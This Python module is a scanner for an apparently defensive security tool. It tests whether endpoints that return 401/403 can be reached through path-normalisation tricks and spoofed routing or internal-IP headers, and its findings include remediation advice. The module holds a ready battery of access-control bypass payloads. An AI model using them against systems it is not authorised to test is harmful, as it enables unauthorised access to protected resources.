"""Access-control bypass scanner: 401/403 -> 200 via path/header tricks.

For every endpoint the app answers with **401/403**, this scanner replays the
request through a battery of well-known front-end/proxy bypasses and flags any
that flip the deny into a **2xx** serving genuinely different content:

  - **Path normalisation** the edge and the origin disagree on: trailing
    ``/``/``/.``/``/./``, ``//`` prefix, ``;``/``;/``/``/..;/`` matrix params,
    encoded ``%2e``/``%2f``/``%09``/``%20`` suffixes, ``.json`` extension, and a
    case flip - classic "the WAF blocks ``/admin`` but the app serves
    ``/admin/.``".
  - **Header overrides** a trusting reverse proxy honours: ``X-Original-URL`` /
    ``X-Rewrite-URL`` routing, and ``X-Forwarded-For`` / ``X-Real-IP`` /
    ``X-Custom-IP-Authorization`` = ``127.0.0.1`` internal-IP spoofing.

Detection is deterministic and low-false-positive: the original must be a real
deny (401/403), the bypass must be 2xx, the body must **differ** from the deny
page, and it must not itself be a login/deny page. Read-only GETs, scope-checked,
one finding per path (the first technique that works).
"""

from __future__ import annotations

from collections.abc import AsyncIterator
from urllib.parse import urlsplit, urlunsplit

import httpx

from orthrus.core.context import ScanContext
from orthrus.core.schemas import Aggressiveness, Confidence, Evidence, Finding, HttpMethod, Severity
from orthrus.scanners.base_scanner import BaseScanner
from orthrus.scanners.registry import register
from orthrus.utils.logger import get_logger
from orthrus.utils.scope import ScopeViolation

logger = get_logger("scanner.403-bypass")

SCANNER_NAME = "403-bypass"
MAX_TARGETS = 40
_UA = "Mozilla/5.0 (compatible; ORTHRUS 403-bypass)"

# Phrases that mark a page as itself a denial / login wall - a "200" carrying any
# of these is not a real bypass (soft-403 or a redirect-to-login rendered inline).
_DENY_MARKERS = (
    "access denied",
    "forbidden",
    "not authorized",
    "unauthorized",
    "permission denied",
    "must log in",
    "please log in",
    "please sign in",
    "sign in to continue",
    "authentication required",
    "403 forbidden",
    "401 unauthorized",
)


def _similar(a: str, b: str, tolerance: float = 0.05) -> bool:
    la, lb = len(a or ""), len(b or "")
    if max(la, lb) == 0:
        return True
    return abs(la - lb) / max(la, lb) <= tolerance


def path_bypass_variants(path: str) -> list[tuple[str, str]]:
    """Deterministic path mutations that edges and origins often normalise apart.

    Returns ``(label, mutated_path)`` pairs, deduplicated and excluding no-ops.
    """
    p = path or "/"
    seg = p.rstrip("/") or ""  # path without a trailing slash
    trailing = p.endswith("/")
    candidates: list[tuple[str, str]] = [
        ("trailing-slash", p if trailing else p + "/"),
        ("trailing-dot", seg + "/."),
        ("dot-slash-suffix", seg + "/./"),
        ("double-slash-prefix", "/" + p),  # //admin
        ("dot-slash-prefix", "/." + p),  # /./admin
        ("semicolon-suffix", seg + ";"),
        ("semicolon-slash", seg + ";/"),
        ("matrix-dotdot", seg + "/..;/"),
        ("encoded-slash-suffix", seg + "%2f"),
        ("encoded-dot-suffix", seg + "/%2e"),
        ("space-suffix", seg + "%20"),
        ("tab-suffix", seg + "%09"),
        ("json-ext", seg + ".json"),
        ("uppercase", p.upper()),
        ("double-slash-suffix", seg + "//"),
    ]
    out: list[tuple[str, str]] = []
    seen: set[str] = {p}  # never re-issue the original path
    for label, mutated in candidates:
        if mutated and mutated not in seen:
            seen.add(mutated)
            out.append((label, mutated))
    return out


def header_bypass_variants(path: str, base_url: str) -> list[tuple[str, dict[str, str]]]:
    """Header-override bypasses sent to the *original* forbidden URL."""
    return [
        ("x-original-url", {"X-Original-URL": path}),
        ("x-rewrite-url", {"X-Rewrite-URL": path}),
        ("x-override-url", {"X-Override-URL": path}),
        ("x-forwarded-for-localhost", {"X-Forwarded-For": "127.0.0.1"}),
        ("x-real-ip-localhost", {"X-Real-IP": "127.0.0.1"}),
        ("x-originating-ip-localhost", {"X-Originating-IP": "127.0.0.1"}),
        ("x-remote-ip-localhost", {"X-Remote-IP": "127.0.0.1"}),
        ("x-remote-addr-localhost", {"X-Remote-Addr": "127.0.0.1"}),
        ("x-client-ip-localhost", {"X-Client-IP": "127.0.0.1"}),
        ("x-custom-ip-authorization", {"X-Custom-IP-Authorization": "127.0.0.1"}),
        ("x-forwarded-host-localhost", {"X-Forwarded-Host": "localhost"}),
        ("referer-self", {"Referer": base_url}),
    ]


def bypass_succeeded(
    orig_status: int, orig_body: str, variant_status: int, variant_body: str
) -> bool:
    """True iff a real 401/403 deny turned into a genuine 2xx serving new content."""
    if orig_status not in (401, 403):
        return False
    if not (200 <= variant_status < 300):
        return False
    low = (variant_body or "").lower()
    if any(marker in low for marker in _DENY_MARKERS):
        return False
    # A bypass must serve *different* content than the deny page; an edge that
    # returns 200 but re-renders the same forbidden body is not a bypass.
    if _similar(orig_body, variant_body):
        return False
    return True


def _swap_path(url: str, new_path: str) -> str:
    parts = urlsplit(url)
    return urlunsplit((parts.scheme, parts.netloc, new_path, parts.query, ""))


def _origin(url: str) -> str:
    parts = urlsplit(url)
    return f"{parts.scheme}://{parts.netloc}"


@register
class Bypass403Scanner(BaseScanner):
    name = SCANNER_NAME
    vuln_type = "access-control"
    min_aggressiveness = Aggressiveness.NORMAL

    async def scan(self, ctx: ScanContext) -> AsyncIterator[Finding]:
        seen_paths: set[tuple[str, str, str]] = set()
        # Prioritise endpoints already seen denying (recorded 401/403) so the
        # request budget is spent where a bypass is actually possible.
        endpoints = sorted(
            (ep for ep in ctx.endpoints if ep.method == HttpMethod.GET),
            key=lambda e: 0 if e.response_status in (401, 403) else 1,
        )
        tested = 0
        for ep in endpoints:
            if tested >= MAX_TARGETS:
                break
            parts = urlsplit(ep.url)
            key = (parts.scheme, parts.netloc, parts.path)
            if key in seen_paths or not ctx.scope.is_allowed(ep.url):
                continue
            seen_paths.add(key)

            base = await self._get(ctx, ep.url)
            if base is None:
                continue
            tested += 1
            if base.status_code not in (401, 403):
                continue

            finding = await self._try_bypasses(ctx, ep.url, base.status_code, base.text)
            if finding is not None:
                yield finding

    async def _try_bypasses(
        self, ctx: ScanContext, url: str, orig_status: int, orig_body: str
    ) -> Finding | None:
        path = urlsplit(url).path or "/"

        for label, mutated in path_bypass_variants(path):
            target = _swap_path(url, mutated)
            if not ctx.scope.is_allowed(target):
                continue
            resp = await self._get(ctx, target)
            if resp is not None and bypass_succeeded(
                orig_status, orig_body, resp.status_code, resp.text
            ):
                return self._finding(url, orig_status, "path", label, mutated, resp.status_code)

        for label, headers in header_bypass_variants(path, _origin(url)):
            resp = await self._get(ctx, url, headers=headers)
            if resp is not None and bypass_succeeded(
                orig_status, orig_body, resp.status_code, resp.text
            ):
                hdr = next(iter(headers.items()))
                return self._finding(
                    url, orig_status, "header", label, f"{hdr[0]}: {hdr[1]}", resp.status_code
                )
        return None

    async def _get(
        self, ctx: ScanContext, url: str, headers: dict[str, str] | None = None
    ) -> httpx.Response | None:
        hdrs = {"User-Agent": _UA, **(headers or {})}
        try:
            return await ctx.http.request("GET", url, headers=hdrs, follow_redirects=False)
        except (ScopeViolation, httpx.HTTPError, httpx.InvalidURL, ValueError, UnicodeError) as exc:
            logger.debug("403-bypass probe failed for %s: %s", url, exc)
            return None

    def _finding(
        self,
        url: str,
        orig_status: int,
        kind: str,
        label: str,
        mutation: str,
        new_status: int,
    ) -> Finding:
        via = f"path mutation '{mutation}'" if kind == "path" else f"request header '{mutation}'"
        return Finding(
            vuln_type="access-control",
            title=f"Access-control bypass ({kind}) on a {orig_status}-protected resource",
            severity=Severity.HIGH,
            confidence=Confidence.FIRM,
            url=url,
            description=(
                f"'{url}' returned HTTP {orig_status} to a normal request, but the same resource "
                f"returned HTTP {new_status} with different content when requested via {via}. A "
                "front-end proxy or WAF enforces the access-control decision on the literal request "
                "line, while the origin normalises the path (or trusts the header) differently - so "
                "the protection can be skipped entirely."
            ),
            remediation=(
                "Enforce authorization at the origin/application layer, not only at the edge, and "
                "canonicalise the request path before the access-control decision. Ignore "
                "client-supplied routing/IP headers (X-Original-URL, X-Rewrite-URL, X-Forwarded-For, "
                "X-Custom-IP-Authorization) unless set by a trusted proxy you control."
            ),
            cwe="CWE-285",
            scanner=SCANNER_NAME,
            evidence=Evidence(
                request_raw=f"GET {url}  (bypass via {mutation})",
                matched_at=f"{orig_status} -> {new_status} via {label}",
                notes=(
                    f"baseline HTTP {orig_status}; {kind} bypass '{label}' ({mutation}) returned "
                    f"HTTP {new_status} with a body distinct from the deny page"
                ),
            ),
        )


__all__ = [
    "Bypass403Scanner",
    "path_bypass_variants",
    "header_bypass_variants",
    "bypass_succeeded",
]
